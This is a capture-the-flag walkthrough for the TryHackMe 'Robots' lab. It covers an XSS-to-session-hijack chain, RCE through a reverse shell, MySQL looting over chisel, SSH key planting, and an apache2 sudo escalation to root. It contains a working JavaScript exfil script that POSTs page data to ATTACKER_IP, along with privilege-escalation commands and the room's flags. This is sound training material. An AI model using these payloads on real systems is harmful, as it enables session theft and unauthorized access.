
# 🤖 TryHackMe: Robots (Hard)

> A web application hacking challenge involving XSS, session hijacking, database exploitation, SSH pivoting, and multi-stage privilege escalation.

---

## 🎯 Objectives

- Identify vulnerable services and paths
- Exploit XSS for session hijacking
- Gain remote shell access
- Perform local enumeration and database extraction
- Pivot SSH users and escalate to root

---

## 🔧 Tools Used

- `nmap`, `curl`, `ffuf`
- `Python3 HTTP Server`, `nc`
- `MySQL Client`
- `chisel` (port forwarding)
- `ssh`
- `GTFOBins`
- `Burp Suite`

---

## 🔍 Scanning & Enumeration

Performed aggressive Nmap scan:

```bash
nmap -A -sV 10.10.151.212
```

Discovered open ports:
- 22/tcp (SSH)
- 80/tcp (HTTP – Apache 2.4.61)
- 9000/tcp (HTTP – Apache 2.4.52)

---

## 📄 Exploring `/robots.txt`

```bash
curl http://10.10.151.212/robots.txt
```

Found:
```
Disallow: /harming/humans
Disallow: /ignoring/human/orders
Disallow: /harm/to/self
```

Added `robots.thm` to `/etc/hosts`.

---

## 🕵️ Web Application Analysis

Discovered:
- XSS vulnerability in username field (login page)
- `PHPSESSID` cookie was HttpOnly (could not directly steal)

Found `/harm/to/self/server_info.php` leaking `phpinfo()` with session data.

---

## 💥 Exploiting XSS to Hijack Session

Payload:
```html
<script src="http://ATTACKER_IP/xs3.js"></script>
```

**xs3.js** script:
```javascript
async function exfil() {
    const response = await fetch('/harm/to/self/server_info.php');
    const text = await response.text();

    await fetch('http://ATTACKER_IP/exfil', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `data=${btoa(text)}`
    });
}
exfil();
```

- Exfiltrated session ID via listener on port 81
- Base64 decoded the PHPSESSID
- Logged in as admin

---

## 🛠️ Gaining Shell

- Found **admin.php** executing user-provided URLs.
- Hosted `shell.php` on attacker machine.
- Used RCE to get reverse shell back.

---

## 🗄️ Database Looting

- Discovered database credentials in PHP source code.
- Used **chisel** for port forwarding to MySQL.
- Extracted users table containing admin and rgiskard credentials.

SSH logged in as `rgiskard`.

---

## 🔥 Privilege Escalation - User to User

Checked `sudo -l`:

```bash
User rgiskard may run the following commands:
(dolivaw) /usr/bin/curl 127.0.0.1/*
```

Used curl to:
- Read `/home/dolivaw/user.txt` for **User Flag**:
```
THM{9b17d3c3e86c944c868c57b5a7fa07d8}
```

---

## 🧠 SSH Pivot to `dolivaw`

Uploaded SSH key by:
```bash
sudo -u dolivaw /usr/bin/curl 127.0.0.1/ATTACKER_IP/id_ed25519.pub -o /home/dolivaw/.ssh/authorized_keys
```

Logged in:
```bash
ssh -i id_ed25519 dolivaw@robots.thm
```

---

## 🏁 Privilege Escalation - Root

Checked `sudo -l`:

```bash
User dolivaw may run: /usr/sbin/apache2
```

Used GTFOBins trick:

Fixed APACHE_RUN_DIR error by:
```bash
sudo /usr/sbin/apache2 -C 'Define APACHE_RUN_DIR /tmp' -C 'Include /root/root.txt' -k stop
```

Extracted **Root Flag**:
```
THM{2a279561f5eea907f7617df3982cee24}
```

---

## 📚 What I Learned

- Exploiting HttpOnly cookies indirectly via phpinfo() leaks
- Building realistic XSS exfil scripts
- Chaining session hijack to RCE
- Database dumping through port forwarding
- SSH pivoting between users
- Root escalation via misconfigured sudo permissions on services

---

✅ End of Walkthrough.
